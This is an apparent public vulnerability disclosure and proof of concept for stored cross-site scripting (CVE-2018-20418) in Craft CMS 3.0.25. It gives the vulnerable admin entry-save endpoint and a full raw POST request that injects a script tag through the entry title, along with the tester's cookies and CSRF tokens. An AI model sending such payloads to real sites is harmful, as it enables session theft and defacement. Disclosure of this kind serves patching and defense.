@@ -1,0 +1,39 @@
+# Exploit Title: Craft CMS 3.0.25 - Cross-Site Scripting
+# Google Dork: N/A
+# Date: 2018-12-20
+# Exploit Author: Raif Berkay Dincel
+# Contact: www.raifberkaydincel.com
+# More Details [1] : https://www.raifberkaydincel.com/craft-cms-3-0-25-cross-site-scripting-vulnerability.html
+# More Details [2] : https://github.com/rdincel1/Craft-CMS-3.0.25---Cross-Site-Scripting/blob/master/README.md
+# Vendor Homepage: craftcms.com 
+# Vulnerable Software --> [ https://github.com/rdincel1/Craft-CMS-3.0.25---Cross-Site-Scripting/raw/master/Craft-3.0.25.rar ] 
+# Affected Version: [ 3.0.25 ]
+# CVE-ID: CVE-2018-20418
+# Tested on: Kali Linux / Linux Mint / Windows 10
+ 
+# Vulnerable Parameter Type: POST 
+# Vulnerable Parameter: http://127.0.0.1/admin-panel-path/index.php?p=admin/actions/entries/save-entry
+# Attack Pattern: <script>alert("Raif_Berkay")</script> 
+ 
+# Description
+ 
+Allows it to run a Cross-Site Scripting by saving a new title from the console tab.
+ 
+# Proof of Concepts:
+ 
+POST /admin-panel-path/index.php?p=admin/actions/entries/save-entry HTTP/1.1
+Host: IP:PORT
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Registered-Asset-Bundles: ,craft\web\assets\quickpost\QuickPostAsset,craft\web\assets\cp\CpAsset,craft\web\assets\d3\D3Asset,craft\web\assets\elementresizedetector\ElementResizeDetectorAsset,craft\web\assets\garnish\GarnishAsset,yii\web\JqueryAsset,craft\web\assets\jquerytouchevents\JqueryTouchEventsAsset,craft\web\assets\velocity\VelocityAsset,craft\web\assets\jqueryui\JqueryUiAsset,craft\web\assets\jquerypayment\JqueryPaymentAsset,craft\web\assets\datepickeri18n\DatepickerI18nAsset,craft\web\assets\picturefill\PicturefillAsset,craft\web\assets\selectize\SelectizeAsset,craft\web\assets\fileupload\FileUploadAsset,craft\web\assets\xregexp\XregexpAsset,craft\web\assets\fabric\FabricAsset,craft\web\assets\prismjs\PrismJsAsset,craft\redactor\assets\field\FieldAsset,craft\redactor\assets\redactor\RedactorAsset,IP:PORT/admin-panel-path/cpresources/699311eb/fullscreen.js,IP:PORT/admin-panel-path/cpresources/5ec6eb0d/video.js,craft\web\assets\matrix\MatrixAsset,craft\web\assets\recententries\RecentEntriesAsset,craft\web\assets\feed\FeedAsset,craft\web\assets\dashboard\DashboardAsset
+X-Registered-Js-Files: ,IP:PORT/admin-panel-path/cpresources/210842f9/d3.js?v=1545257354,IP:PORT/admin-panel-path/cpresources/8c97f5da/element-resize-detector.js?v=1545257354,IP:PORT/admin-panel-path/cpresources/a3075e2f/jquery.js?v=1545257354,IP:PORT/admin-panel-path/cpresources/28095e6a/jquery.mobile-events.min.js?v=1545257354,IP:PORT/admin-panel-path/cpresources/b288a952/velocity.js?v=1545257354,IP:PORT/admin-panel-path/cpresources/12b5557f/garnish.js?v=1545257354,IP:PORT/admin-panel-path/cpresources/fc2132f7/jquery-ui.min.js?v=1545257354,IP:PORT/admin-panel-path/cpresources/aeaf06ba/jquery.payment.js?v=1545257354,IP:PORT/admin-panel-path/cpresources/6270e830/datepicker-tr.js?v=1545257354,IP:PORT/admin-panel-path/cpresources/2fad62a8/picturefill.js?v=1545257354,IP:PORT/admin-panel-path/cpresources/7bd34f2c/selectize.js?v=1545257354,IP:PORT/admin-panel-path/cpresources/37456356/jquery.fileupload.js?v=1545257354,IP:PORT/admin-panel-path/cpresources/71bf0ba6/xregexp-all.js?v=1545257354,IP:PORT/admin-panel-path/cpresources/7f38141/fabric.js?v=1545257354,IP:PORT/admin-panel-path/cpresources/7dfc6a65/js/Craft.min.js?v=1545257354,IP:PORT/admin-panel-path/cpresources/92be564/QuickPostWidget.min.js?v=1545257412,IP:PORT/admin-panel-path/cpresources/2a8f54e3/prism.js?v=1545257412,IP:PORT/admin-panel-path/cpresources/d443ac9b/redactor.min.js?v=1545257412,IP:PORT/admin-panel-path/cpresources/d443ac9b/lang/tr.js?v=1545257412,IP:PORT/admin-panel-path/cpresources/a919311b/js/PluginBase.min.js?v=1545257412,IP:PORT/admin-panel-path/cpresources/a919311b/js/CraftAssetImageEditor.min.js?v=1545257412,IP:PORT/admin-panel-path/cpresources/a919311b/js/CraftAssetImages.min.js?v=1545257412,IP:PORT/admin-panel-path/cpresources/a919311b/js/CraftAssetFiles.min.js?v=1545257412,IP:PORT/admin-panel-path/cpresources/a919311b/js/CraftEntryLinks.min.js?v=1545257412,IP:PORT/admin-panel-path/cpresources/a919311b/js/RedactorInput.min.js?v=1545257412,IP:PORT/admin-panel-path/cpresources/a919311b/js/RedactorOverrides.min.js?v=1545257412,IP:PORT/admin-panel-path/cpresources/699311eb/fullscreen.js,IP:PORT/admin-panel-path/cpresources/5ec6eb0d/video.js,IP:PORT/admin-panel-path/cpresources/2fd586d6/MatrixInput.min.js?v=1545257412,IP:PORT/admin-panel-path/cpresources/5938f19a/RecentEntriesWidget.min.js?v=1545257412,IP:PORT/admin-panel-path/cpresources/ff3b78b9/FeedWidget.min.js?v=1545257412,IP:PORT/admin-panel-path/cpresources/86785e72/Dashboard.min.js?v=1545257412
+X-CSRF-Token: 3DfArizwnHjDchbSztLrD2y9nzm5ZkSF2zukx2PZ3i6suVVTRScwwqtvPKqGXYiVZW1POc8cGtXlnjRfrfplCa1kg6nfVMOwm6fPN3BvkYrtM5QsDEV3dYhbSN1lBW6wFSNfiReM9Q3nAb9ut55USDtdUvokmt1DCs4AOm9Y0Ue1Gx1cmGd1Rzy0v3qTP3MsTi9z4tNJEVFdFMBCFtcEgKxH00WYzD8GdZk2aDlHVJHrMHOLTYzf1SzY2dJlO9ifBT0ZJcJNkvQk83bcygPe64lHjeBls_0-qCtA66-Qmz8L79Jw3QRysr5UkIEis6ZWmtAUCg9ufY_XDgrJ4D6xoV1Udw6pKny00KkAaszDUzyVXbrLuzWn063CqwRIDPS6jgr2Hjl8ERbpOinsVzELgiAbO7pxvJM00FTPI_nXFyl9NgusHfufMzqpUncmPLNxgn5yaN4mHz9EgtY7ynU6YQNTQp73e3B1bCfkd3zvZtP-KJgUwqVPbAHQUV5_HwPDxVs02R-_irNvlPeDAHaR6zdETXeKfLycZ70-kJtIqpo=
+Content-Length: 857
+Connection: close
+Cookie: _ga=GA1.2.143638489.1545256652; _gid=GA1.2.362987822.1545256652; 1031b8c41dfff97a311a7ac99863bdc5_identity=3fe8168bce4c48f844d43d3855ef833d47ba56edc78686d732690216a40a7ee6a%3A2%3A%7Bi%3A0%3Bs%3A41%3A%221031b8c41dfff97a311a7ac99863bdc5_identity%22%3Bi%3A1%3Bs%3A243%3A%22%5B%221%22%2C%22%5B%5C%226wiT39UWdaEONl4iVMf6YZKo0TXsitqlapyaB4s1w9PJxkC3lUIyQsTP12pW0NLCU03hRa_X8SAglzpjlTUJh47RcOcmjgBQE9uO%5C%22%2C%5C%2212a6fb6b-eb72-44c3-b890-6c71b8d2bb88%5C%22%2C%5C%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A64.0%29+Gecko%2F20100101+Firefox%2F64.0%5C%22%5D%22%2C3600%5D%22%3B%7D; 1031b8c41dfff97a311a7ac99863bdc5_username=2365234bf6c8d0bafa98169137b93dc9e6af973d5135b3f0dd94d23d71c923d2a%3A2%3A%7Bi%3A0%3Bs%3A41%3A%221031b8c41dfff97a311a7ac99863bdc5_username%22%3Bi%3A1%3Bs%3A5%3A%22admin%22%3B%7D; CraftSessionId=asetaditigin2tb5uerlivl8h7; CRAFT_CSRF_TOKEN=f4c4ded0838271c4ba50e1e2953119ff3b266d2cedaeba1984823672a14f6e71a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A208%3A%22UpMNICaFkYV9aBp0gRMIdb67eo4FAjxx6iAYJIMM%7Ca6cfc948987f6fa5745a965899bdadc6ed38ce0c9b259fcaaa124e258d3f0f97UpMNICaFkYV9aBp0gRMIdb67eo4FAjxx6iAYJIMM%7C1%7C%242a%2413%245j8bSRoKQZipjtIg6FXWR.kGRR3UfCL.QeMIt2yTRH1.hCNHLQKtq%22%3B%7D; _gat=1
+Cache-Control: no-transform
+ 
+enabled=1&fieldsLocation=fields1428173416&CRAFT_CSRF_TOKEN=3DfArizwnHjDchbSztLrD2y9nzm5ZkSF2zukx2PZ3i6suVVTRScwwqtvPKqGXYiVZW1POc8cGtXlnjRfrfplCa1kg6nfVMOwm6fPN3BvkYrtM5QsDEV3dYhbSN1lBW6wFSNfiReM9Q3nAb9ut55USDtdUvokmt1DCs4AOm9Y0Ue1Gx1cmGd1Rzy0v3qTP3MsTi9z4tNJEVFdFMBCFtcEgKxH00WYzD8GdZk2aDlHVJHrMHOLTYzf1SzY2dJlO9ifBT0ZJcJNkvQk83bcygPe64lHjeBls_0-qCtA66-Qmz8L79Jw3QRysr5UkIEis6ZWmtAUCg9ufY_XDgrJ4D6xoV1Udw6pKny00KkAaszDUzyVXbrLuzWn063CqwRIDPS6jgr2Hjl8ERbpOinsVzELgiAbO7pxvJM00FTPI_nXFyl9NgusHfufMzqpUncmPLNxgn5yaN4mHz9EgtY7ynU6YQNTQp73e3B1bCfkd3zvZtP-KJgUwqVPbAHQUV5_HwPDxVs02R-_irNvlPeDAHaR6zdETXeKfLycZ70-kJtIqpo%3D&title=%3Cscript%3Ealert("Raif_XSS")%3C%2Fscript%3E&fields1428173416%5BfeaturedImage%5D=&fields1428173416%5BshortDescription%5D=&fields1428173416%5Bheading%5D=&fields1428173416%5Bsubheading%5D=&fields1428173416%5BarticleBody%5D=&sectionId=2&typeId=2
